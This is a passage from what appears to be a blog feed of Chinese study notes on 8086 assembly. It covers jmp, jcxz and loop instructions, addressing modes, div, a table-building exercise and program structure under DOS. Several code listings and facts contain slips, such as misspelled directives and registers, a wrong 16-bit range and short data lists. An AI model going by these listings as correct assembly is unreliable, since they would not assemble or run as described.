    <content type="html"><![CDATA[<p>转移指令类似于高级语言中的go to指令</p><h1>8086CPU的转移指令分类：</h1><ul><li>无条件转移指令（如：jmp）</li><li>条件转移指令</li><li>循环指令（如：loop）</li><li>过程（相当于C中的函数）</li><li>中断（:star:)</li></ul><h1>操作符offset</h1><ul><li><p>伪指令</p></li><li><p>offset是由编译器处理的符号，功能：取得标号的偏移地址</p></li><li><p>例：</p><ul><li>1、</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>codesg segment<br><br>start:mov ax,offset start  ;相当于mov ax,0<br>s:mov ax,offset s      ;相当于mov,ax,3(上一句对于3个字节的机器码)<br><br>codesg ends<br>end start<br></code></pre></td></tr></table></figure><ul><li>2、</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">;添加2条指令，使该程序在运行中将s处的一条指令复制到s0处<br>assume cs:codesg<br>codesg segment<br>s:mov ax,bx    ;nop的机器码占一个字节<br>  mov si,offset s<br>  mov di,offset s0<br>  <br>  ;代码填写处<br>  mov ax,cs:[si]<br>  mov cs:[di],ax<br>  <br>s0:nop<br>   nop<br>codesg ends<br>ends<br></code></pre></td></tr></table></figure><p>分析：</p><p>1、s和s0处的指令所在的内存单元的地址：</p><p>​      cs：offset s和cs：offset s0</p><p>2、将s处的指令复制到s0处，就是将cs：offset s处的数据复制到cs：offset s0处</p><p>3、段地址已知在cs中，偏移地址offset s0和offset s0已经送入si和di中</p><p>4、要复制的数据长度：</p><p>​      mov ax,bx指令的长度为两个字节，即一个字</p><p>答案：mov ax,cs:[si]、mov cs:[di],ax</p></li></ul><h1>jmp指令</h1><ul><li><p>jmp为无条件转移，可以只修改IP，也可以同时修改CS和IP</p></li><li><p>jmp指令要给出两种信息：</p><ul><li>转移的目的地址</li><li>转移的距离（段间转移、段内短转移、段内近转移）</li></ul></li><li><p>依据位移进行转移的jmp指令</p><ul><li><p>**jmp short 标号 **（转移到标号处执行指令）</p><p>这种格式的jmp指令实现的使段内短转移，它对IP的修改范围为-128~127</p><p>它向前转移时最多越过128个字节，向后转移最多可以越过127个字节</p></li><li><p>机器指令中不包含目的地址，也就是说，CPU不需要这个目的地组织就可以实现对IP的修改</p></li><li><p>&quot;jmp short 标号&quot;的功能：（IP）=（IP）+8位位移：</p><ul><li>8位位移=”标号“处的地址-jmp指令后的第一个字节的地址</li><li>short指明此处的位移为8位位移</li><li>8位位移的范围位-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul></li><li><p><strong>jmp near ptr 标号</strong>（功能相似）</p><ul><li>实现近转移</li><li>功能：（IP）=（IP）+16位位移</li><li>16位位移=”标号“处的地址-jmp指令后的第一个字节的地址</li><li>near ptr指明此处的位移为16位位移</li><li>16位位移的范围：-32769~32767，用补码表示</li><li>16位位移由编译程序在编译时算出</li></ul></li></ul></li></ul><h1>转移的目的地址在指令中的jmp指令</h1><h5 id="jmp-far-ptr-标号">jmp far ptr 标号</h5><p>实现段间转移，又称为远转移</p><ul><li>功能：<ul><li>（CS）=标号所在段的段地址</li><li>（IP）=标号所在段中的偏移地址</li><li>far ptr指明了指令用标号的段地址和偏移地址修改CS和IP</li></ul></li></ul><h1>转移地址在内存中的jmp指令</h1><ul><li><p>转移地址在内存中的jmp指令有两种格式</p><ul><li><p>jmp word ptr内存单元地址（段内地址）</p><p>功能：从内存单元地址处开始存放一个字，是转移的目的偏移地址</p><p>内存单元地址可用寻址方式的任一格式给出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0123h<br>mov ds:[0],ax<br>jmp word ptr ds:[0]<br>;执行后，(IP)=0123H<br><br>mov ax,0123h<br>mov [bx],ax<br>jmp word ptr [bx]<br>;执行后，(IP)=0123H<br></code></pre></td></tr></table></figure></li><li><p>jmp dword ptr 内存单元地址（段间转移）  （dword：32个位，4个字节）</p><p>功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址</p><p>(CS)=(内存单元地址+2)</p><p>(IP)=(内存单元地址)</p><p>内存单元地址可用寻址方式的任一格式给出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0123H<br>mov ds:[0],ax   ;ds:[0]=23,ds:[1]=01<br>mov word ptr ds:[2],0   ;ds:[2]=00,ds:[3]=00<br>jmp dword ptr ds:[0]    ;00000123<br><br>;执行后，(CS)=0,(IP)=0123H<br></code></pre></td></tr></table></figure></li></ul></li></ul><h1>jcxz指令</h1><ul><li><p>jcxz指令为有条件转移指令，所有的有条件转移指令都是短指令，在对应的机器码中包含转移的位移，而不是目的地址，对IP的修改范围都为-128~127</p></li><li><p>指令格式：jcxz 标号  （如果（cx）=0，则转移到标号处执行）</p></li><li><p>jcxz 标号 指令操作：</p><ul><li>当（cx）=0时：（IP）=（IP）+8位位移<ul><li>8位位移=”标号“处的地址-jcxz指令后的第一个字节的地址</li><li>8位位移的范围位-128~127，用补码表示</li><li>8位位移由编译程序在编译时算出</li></ul></li><li>当（cx）≠0时：什么也不做（程序向下执行）</li></ul></li></ul><h1>loop指令</h1><ul><li>loop指令为循环指令，所有的循环指令都是短指令，在对应的机器码中包含转移的位移，而不是目的地址</li><li>对IP的修改范围：-128~127</li><li>指令格式：loop 标号<ul><li>（cx）=（cx）-1</li><li>如果（cx）≠0，转移到标号处执行，（IP）=（IP）+8位位移<ul><li>8位位移=“标号”处的地址-loop指令后的第一个字节的地址</li><li>8位位移的范围为-128~127，用补码表示</li><li>8位位移由编译器在编译时算出</li></ul></li><li>如果（cx）=0，什么也不做（程序向下执行）</li></ul></li></ul><h1>根据位移进行转移的意义</h1><h5 id="1、">1、</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">jmp short 标号<br>jmp near ptr 标号<br>jcxz 标号<br>loop 标号<br></code></pre></td></tr></table></figure><p>这些汇编指令对IP的修改是根据转移目的地址和转移起始地址之间的位移来进行的。在它们对应的机器码中不包含转移的目的地址，而包含的是到目的地址的位移距离</p><h5 id="2、">2、</h5><p><strong>方便程序段在内存中的浮动装配</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov cx,6<br>mov ax,10<br>s:add ax,ax<br>loop s<br></code></pre></td></tr></table></figure><p>这段程序在内存中的不同位置都可以正确执行，因为loop s在执行前只涉及到s的位移（-4，前移四个字节，补码表示位FCH）而不是s的地址</p>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>8-数据处理的两个基本问题</title>
    <link href="/2022/02/16/8%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/"/>
    <url>/2022/02/16/8%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%9F%BA%E6%9C%AC%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>reg：寄存器</p><p>sreg：段寄存器</p><h1>bx、si、di、bp</h1><ul><li><p>在8086CPU中，只有bx、bp、si、di这四个寄存器可以用在[ ]中进行内存单元的寻址</p></li><li><p>在[ ]中，这四个寄存器可以单个出现，或只能以四种组合出现：</p><p>bx+si、bx+di、bp+si、bp+di</p></li><li><p>只要在[ ]总使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中</p></li></ul><h1>机器指令处理地数据所在地位置</h1><ul><li><p>绝大部分机器指令都是进行数据处理地指令，大致可以分为三类：读取、写入、运算</p></li><li><p>在机器指令这一层来讲，并不关心数据的值是多少，而关心执行指令前一刻，它将要处理的数据所在位置</p></li><li><p>指令在执行前，所要处理的数据可以在三个位置：CPU内部、内存、端口</p></li></ul><h1>汇编语言中数据位置的表达</h1><p>汇编语言中用三个概念来表达数据的位置：立即数（idata）、寄存器、段地址（SA）和偏移地址（EA）</p><h5 id="立即数（idata）：">立即数（idata）：</h5><ul><li><p>对于直接包含着机器指令中的数据（执行前在CPU的指令缓冲器中），在汇编语言中称为立即数（idata），在汇编指令中直接给出</p></li><li><p>如mov ax,1</p><p>对应机器码：B80100</p><p>执行结构：（ax）=1</p></li></ul><h1>寻址方式小结</h1><table><thead><tr><th>寻址方式</th><th>含义</th><th>名称</th><th>常用格式举例</th></tr></thead><tbody><tr><td>[idata]</td><td>EA=idata;SA=(ds)</td><td>直接寻址</td><td>[idata]</td></tr><tr><td>[bx]<br />[si]<br />[di]<br />[bp]</td><td>EA=(bx);SA=(ds)<br />EA=(si);SA=(ds)<br />EA=(di);SA=(ds)<br />EA=(bp);SA=(ss)</td><td>寄存器间接寻址</td><td>[bx]</td></tr><tr><td>[bx+idata]<br />[si+idata]<br />[di+idata]<br />[bp+idata]</td><td>EA=(bx)+idata;SA=(ds)<br />EA=(si)+idata;SA=(ds)<br />EA=(di)+idata;SA=(ds)<br />EA=(bp)+idata;SA=(ss)</td><td>寄存器相对寻址</td><td>用于结构体：[bx].idata<br />用于数组：idata[si],idata[di]<br />用于二维数组：[bx] [idata]</td></tr><tr><td>[bx+si]<br />[bx+di]<br />[bp+si]<br />[bp+di]</td><td>EA=(bx)+(si);SA=(ds)<br />EA=(bx)+(di);SA=(ds)<br />EA=(bp)+(si);SA=(ss)<br />EA=(bp)+(di);SA=(ss)</td><td>基址变址寻址</td><td>用于二维数组：[bx] [si]</td></tr><tr><td>[bx+si+idata]<br />[bx+di+idata]<br />[bp+si+idata]<br />[bp+di+idata]</td><td>EA=(bx)+(si)+idata;SA=(ds)<br />EA=(bx)+(di)+idata;SA=(ds)<br />EA=(bp)+(si)+idata;SA=(ss)<br />EA=(bp)+(di)+idata;SA=(ss)</td><td>相对基址变址寻址</td><td>用于表格（结构）中的数组项：[bx].idata[si]<br />用于二维数组：idata[bx] [si]</td></tr></tbody></table><h1>指令要处理的数据有多长</h1><p>8086CPU的指令，可以处理两种尺寸的数据：byte和word。所以在机器指令中要指明，指令进行的是字操作还是字节操作</p><ul><li><p>通过寄存器名指明要处理的数据大小</p><p>mov ax,1</p><p>mov al,1</p></li><li><p>在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte</p><p>mov word ptr ds:[0],1</p><p>add word ptr [bx],2</p></li><li><p>有些指令默认了访问的是字单元还是字节单元</p><p>push指令只进行字操作</p></li></ul><h1>div指令</h1><ul><li><p>div是除法指令（division），使用div作除法时：</p><ul><li><p>除数：8位或16位，在寄存器或内存单元中</p></li><li><p>被除数：（默认）放在AX或DX和AX中</p></li><li><table><thead><tr><th>除数</th><th>被除数</th><th>商</th><th>余数</th></tr></thead><tbody><tr><td>8位</td><td>16位（AX）</td><td>al</td><td>ah</td></tr><tr><td>16位</td><td>32位（DX+AX）</td><td>ax</td><td>dx</td></tr></tbody></table></li></ul></li><li><p>格式：</p><ul><li>div reg</li><li>div 内存单元</li></ul></li><li><p>示例：</p><ul><li><p>div byte ptr ds:[0]</p><ul><li><p>(al)=(ax)/((ds)*16+0)的商</p></li><li><p>(ah)=(ax)/((ds)*16+0)的余数</p></li></ul></li><li><p>div word ptr es:[0]</p><ul><li>(ax)=[(dx) * 10000H+(ax)] / ((ds) * 16+0)的商</li><li>(dx)=[(dx) * 10000H+(ax)] / ((ds) * 16+0)的余数</li></ul></li></ul></li><li><p>实例：</p><p>用除法指令计算100001/100</p><p>（被除数100001大于65535，不能用ax寄存器存放，所以要用dx和ax两个寄存器联合存放100001，也就是说要进行16位的除法）</p></li></ul><h1>实验</h1><h5 id="——寻址方式在结构化数据访问中的应用">——寻址方式在结构化数据访问中的应用</h5><h6 id="题目：">题目：</h6><p>某公司1975-1995年的基本情况如下：</p><table><thead><tr><th>年份</th><th>收入（千美元）</th><th>雇员（人）</th><th>人均收入（千美元）</th></tr></thead><tbody><tr><td>1975</td><td>16</td><td>3</td><td>？</td></tr><tr><td>1976</td><td>22</td><td>7</td><td>？</td></tr><tr><td>1977</td><td>382</td><td>9</td><td>？</td></tr><tr><td>1978</td><td>1356</td><td>13</td><td>？</td></tr><tr><td>1979</td><td>2390</td><td>28</td><td>？</td></tr><tr><td>1980</td><td>8000</td><td>38</td><td>？</td></tr><tr><td>M</td><td></td><td></td><td></td></tr><tr><td>1995</td><td>5937000</td><td>17800</td><td>？</td></tr></tbody></table><p>定义好的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg<br>data segment<br>db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27;,&#x27;1982&#x27;,&#x27;1983&#x27;<br>db &#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27;,&#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27;<br>db &#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27;<br>;以上表示21年的21个字符串<br><br>dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514<br>dd 345980,590827,803530,1183000,2759000,3753000,4649000,5937000<br>;以上是表示21年公司总收入的21个dword型数据(dd:四个字节)<br><br>dw 3,7,9,13,130,220,476,778,1001,1442,2258,2793,4037,5635,8226<br>dw 11542,14430,15257,17800<br>;以上是表示21年公司雇员人数的21个word型数据<br>data ends<br><br>table segment<br>db 21 dup (&#x27;year summ ne ?? &#x27;)<br>table ends<br></code></pre></td></tr></table></figure><p>编程，将data段中的数据按如下格式写入到table段中，并计算21年中的人均收入（取整），结果也按照下面的格式保存在table段中</p><table><thead><tr><th></th><th>年份（4字节）</th><th>空格</th><th>收入（4字节）</th><th>空格</th><th>雇员数（2字节）</th><th>空格</th><th>人均收入（2字节）</th><th>空格</th></tr></thead><tbody><tr><td>行内地址:arrow_right:<br />1年占1行，每行的起始地址<br />⬇</td><td>0,1,2,3</td><td>4</td><td>5,6,7,8</td><td>9</td><td>A,B</td><td>C</td><td>D,E</td><td>F</td></tr><tr><td>table：0</td><td>‘1975’</td><td></td><td>16</td><td></td><td>3</td><td></td><td>?</td><td></td></tr><tr><td>table：10H</td><td>‘1976’</td><td></td><td>22</td><td></td><td>7</td><td></td><td>?</td><td></td></tr><tr><td>table：20H</td><td>‘1977’</td><td></td><td>382</td><td></td><td>9</td><td></td><td>?</td><td></td></tr><tr><td>table：30H</td><td>‘1978’</td><td></td><td>1356</td><td></td><td>13</td><td></td><td>?</td><td></td></tr><tr><td>table：40H</td><td>‘1979’</td><td></td><td>2390</td><td></td><td>28</td><td></td><td>?</td><td></td></tr><tr><td>table：50H</td><td>‘1980’</td><td></td><td>8000</td><td></td><td>38</td><td></td><td>?</td><td></td></tr><tr><td>M</td><td></td><td></td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>table：140H</td><td>‘1995’</td><td></td><td>5937000</td><td></td><td>17800</td><td></td><td>?</td><td></td></tr></tbody></table><p>提示：可将data段中的数据看成是多个数组，而将table中的数据看成是一个结构型数据的数组，每个结构型数据中包含多个数据项。可用bx定位每个结构型数据，用idata定位数据项，用si定位数据项中的每个元素，对于table中的数据的访问可采用[bx].idata和[bx].idata[si]的寻址方式</p><h6 id="分析">分析</h6><ul><li><p>源数据在哪里（注意从0开始）（放在ds中）</p><ul><li>年份：0-53H    [21*4(4个字节)=84=54H]</li><li>收入：54H-0A7H   （不能以字母开头，故写为0A7）</li><li>雇员：0A8H-0D1</li></ul></li><li><p>目标存放位用什么表示 （放在es中）</p><ul><li>年份：</li><li>收入：</li><li>雇员：</li><li>平均收入：</li></ul></li></ul><h6 id="初始化阶段">初始化阶段</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,data<br>mov ds,ax<br>mov ax,table  ;这里因为data已被占用<br>mov es,ax<br><br>mov bx,0<br>mov si,0<br>mov di,0<br>mov cx,21   ;21次循环<br></code></pre></td></tr></table></figure><h6 id="每次循环要执行的任务：">每次循环要执行的任务：</h6><ul><li><p>存放年份(4个字节)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,[bx]   ;例如1<br>mov es:[di],al<br>mov al,[bx+1]   ;9<br>mov e:[di+1],al<br>mov al,[bx+2]    ;8<br>mov es:[di+2],al<br>mov al,[bx+3]   ;9<br>mov es:[di+3],al<br></code></pre></td></tr></table></figure></li><li><p>存放公司总收入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,54h[bx]   ;第一个‘年收入’的段地址为54H<br>mov dx,56h[bx]<br>mov es:5h[di],ax<br>mov es:7h[di],dx<br></code></pre></td></tr></table></figure></li><li><p>存放公司人数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,0A8h[si]   ;第一个‘人数’的段基址为0A8H<br>mov es:0Ah[di],ax<br></code></pre></td></tr></table></figure></li><li><p>计算人均收入并存放</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov ax,54h[bx]<br>mov dx,56h[bx]   ;这两句初始化被除数<br><br>div word ptr ds:0A8h[si]  ;除以人数（16位除数，商默认放在ax中）<br>mov es:0dh[di],ax   ;将商放入指定位置<br></code></pre></td></tr></table></figure></li><li><p>为下一次循环时存放数据做准备</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add bx,4  ;bx确定年份和收入<br>add si,2  ;si确定人数<br>add di,16 ;di确定每行的列数<br></code></pre></td></tr></table></figure></li></ul><h6 id="源代码">源代码</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:codesg,ds:data,es:table<br><br>data segement<br>db &#x27;1975&#x27;,&#x27;1976&#x27;,&#x27;1977&#x27;,&#x27;1978&#x27;,&#x27;1979&#x27;,&#x27;1980&#x27;,&#x27;1981&#x27;,&#x27;1982&#x27;,&#x27;1983&#x27;<br>db &#x27;1984&#x27;,&#x27;1985&#x27;,&#x27;1986&#x27;,&#x27;1987&#x27;,&#x27;1988&#x27;,&#x27;1989&#x27;,&#x27;1990&#x27;,&#x27;1991&#x27;,&#x27;1992&#x27;<br>db &#x27;1993&#x27;,&#x27;1994&#x27;,&#x27;1995&#x27;<br>;以上表示21年的21个字符串<br><br>dd 16,22,382,1356,2390,8000,16000,24486,50065,97479,140417,197514<br>dd 345980,590827,803530,1183000,2759000,3753000,4649000,5937000<br>;以上是表示21年公司总收入的21个dword型数据(dd:四个字节)<br><br>dw 3,7,9,13,130,220,476,778,1001,1442,2258,2793,4037,5635,8226<br>dw 11542,14430,15257,17800<br>;以上是表示21年公司雇员人数的21个word型数据<br>data ends<br><br>table segment<br>db 21 dup (&#x27;year summ ne ?? &#x27;)<br>table ends<br><br>start:<br>mov ax,data<br>mov ds,ax<br>mov ax,table  ;这里因为data已被占用<br>mov es,ax<br><br>mov bx,0<br>mov si,0<br>mov di,0<br>mov cx,21   ;21次循环<br><br><br>s:   ;进入循环<br>        mov al,[bx]   ;例如1<br>        mov es:[di],al<br>        mov al,[bx+1]   ;9<br>        mov e:[di+1],al<br>        mov al,[bx+2]    ;8<br>        mov es:[di+2],al<br>        mov al,[bx+3]   ;9<br>        mov es:[di+3],al<br>        ;以上8句存放年份<br>        <br>        mov ax,54h[bx]   ;第一个‘年收入’的段地址为54H<br>        mov dx,56h[bx]<br>        mov es:5h[di],ax<br>        mov es:7h[di],dx<br>        ;以上8句存放公司总收入<br>        <br>        mov ax,0A8h[si]   ;第一个‘人数’的段基址为0A8H<br>        mov es:0Ah[di],ax<br>        <br>        mov ax,54h[bx]<br>        mov dx,56h[bx]   ;这两句初始化被除数<br><br>        div word ptr ds:0A8h[si]  ;除以人数（16位除数，商默认放在ax中）<br>        mov es:0dh[di],ax   ;将商放入指定位置<br>        <br>        add bx,4  ;bx确定年份和收入<br>        add si,2  ;si确定人数<br>        add di,16 ;di确定每行的列数<br>        ;以上3句为下一次循环时存放数据作准备<br>        ;3个寄存器递增的速度决定了所要存取的数据的位置的偏移地址<br>        <br>    loop s  ;跳到标号s处<br>    <br>mov ax,4c00h<br>int 21h<br><br>codesg ends<br>end start<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>4-第一个程序</title>
    <link href="/2022/02/16/4%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/"/>
    <url>/2022/02/16/4%E7%AC%AC%E4%B8%80%E4%B8%AA%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1>一个源程序从写出到执行的过程</h1><ul><li><p>编写</p><ul><li>用文本编辑器（记事本、Nodepad++、UltraEdit······），用汇编语言编写汇编源程序</li></ul></li><li><p>对源程序进行编译连接</p><ul><li>使用汇编语言编译程序（MASM.EXE）对源程序文件中的源程序进行编译，产生目标文件</li><li>再用连接程序（LINK.EXE）对目标文件进行连接，生成可在操作系统中直接运行的可执行文件</li><li>可执行文件中包含两部分内容<ul><li>程序（啊从原程序中的汇编指令翻译过来的机器码）和数据（源程序中定义的数据）</li><li>相关的描述信息（比如：程序有多大、要占用多少内存空间）</li></ul></li></ul></li><li><p>执行可执行文件的程序</p><ul><li>在操作系统中，执行可执行文件中的程序</li><li>操作系统依照可执行文件中的描述信息，将可执行文件中的机器码和数据加载如内存，并进行相关的初始化（比如：设置CS：IP指向的第一条要执行的指令），然后有CPU执行程序</li></ul></li></ul><h1>源程序</h1><h5 id="汇编指令">汇编指令</h5><p>有对应的机器码的指令，可以被编译为机器指令，最终为CPU所执行</p><h5 id="伪指令">伪指令</h5><ul><li><p>没有对应的机器码的指令，最终不被CPU所执行</p></li><li><p>伪指令是由编译器来执行的指令，编译器根据伪指令来进行相关的编译工作</p></li><li><p>定义一个段</p><ul><li><p>segment和ends时一对成对使用的伪指令，这是在写可被编译器编译的汇编程序时，必须要用到的一对伪指令</p></li><li><p>segment和ends的功能就是定义一个段，segment说明一个段的开始，ends说明一个段的结束</p></li><li><p>一个段必须有一个名称来标识，格式：</p><p>段名   segment</p><p>段名   ends</p></li><li><p>一个汇编程序是由多个段组成的，这些段被用来存放代码、数据或当作栈空间来使用</p></li><li><p>一个有意义的程序中至少要有一个段，这个段用来存放代码</p></li></ul></li><li><p>end：一个汇编程序的结束标记</p></li><li><p>汇编源程序：</p><p>伪指令（编译器处理）</p><p>汇编指令（编译为机器码）</p></li><li><p>程序：源程序中最终由计算机执行、处理的指令或数据</p></li><li><p>可以将源程序文件中的所有内容成为源程序，将源程序中最终由计算机执行处理的指令或数据成为程序</p></li><li><p>程序最先以汇编指令的形式存在源程序中，经编译、连接后转变为机器码，存储在可执行文件中</p></li></ul><h5 id="标号">标号</h5><ul><li>一个标号指代了一个地址</li><li>codesg：放在segment的前面，作为一个段的名称，这个段的名称最终将被编译、连接程序处理为一个段的段地址</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">计算：2^3：<br>assume cs:abc<br>abc segment<br>move ax,2<br>add ax,ax<br>add ax,ax<br>abc ends<br>end<br></code></pre></td></tr></table></figure><h5 id="DOS中的程序运行">DOS中的程序运行</h5><ul><li>DOS是一个单任务操作系统</li><li>一个程序P2在可执行文件中，则必须由一个正在运行的程序P1，将P2从可执行文件中载入内存后，将CPU的控制权交给P2，P2才能得以运行。P2开始运行后，P1暂停运行</li><li>当P2运行完毕后，应该将CPU的控制权交还给使它得以运行的程序P1，此后P1继续运行</li></ul><h5 id="程序返回">程序返回</h5><ul><li><p>一个程序结束后，将CPU的控制权交换给使它的以运行的程序的过程</p></li><li><p>应该在程序末尾添加啊返回的程序段：</p><p>mov ax，4c00H</p><p>int 21H</p><p>（int：DOS中的‘’中断’‘）</p></li><li><p>汇编指令，编译时由CPU执行</p></li></ul><h5 id="连接的作用">连接的作用</h5><ul><li>当源程序很大时，可以将它分为多个源程序文件来编译，每个源程序编译为目标文件后再用连接程序将它们连接到一起，生成一个可执行文件</li><li>程序中调用了某个库文件中的子程序，需要将这个库和该程序生成的目标文件连接到一起，生成一个可执行文件</li><li>一个源程序编译后，得到了存有机器码的目标文件，目标文件中的有些内容还不能直接用来生成可执行文件，连接程序将这些内容处理为最终的可执行信息</li><li>在只有一个源程序文件，而又不需要调用某个库中的子程序的情况下，也必须用连接程序对目标文件进行处理，生成可执行文件</li></ul><h5 id="操作系统的外壳">操作系统的外壳</h5><ul><li>操作系统是由多个功能模块组成的庞大、复杂的软件系统。任何通用的操作系统，都要提供一个成为shell（外壳）的程序，用户使用这个程序来操作计算机系统工作</li><li><a href="http://xn--DOScommand-sf2pypgb0500c6t0ast7d.com">DOS中有一个程序command.com</a>，这个程序在DOS中成为命令解释器，也就是DOS系统的shell</li></ul><h5 id="汇编程序从写出到执行的过程：">汇编程序从写出到执行的过程：</h5><p>编程-&gt;1.asm-&gt;编译-&gt;1.obj-&gt;连接-&gt;1.exe-&gt;加载-&gt;内存中的程序-&gt;运行</p><h5 id="debug">debug</h5><p>debug可以将程序加载如内存，设置CS：IP指向程序的入口，但debug并不放弃对CPU的控制，这样就可以用debug的相关命令来单步执行程序，查看每条指令的执行结果</p><h5 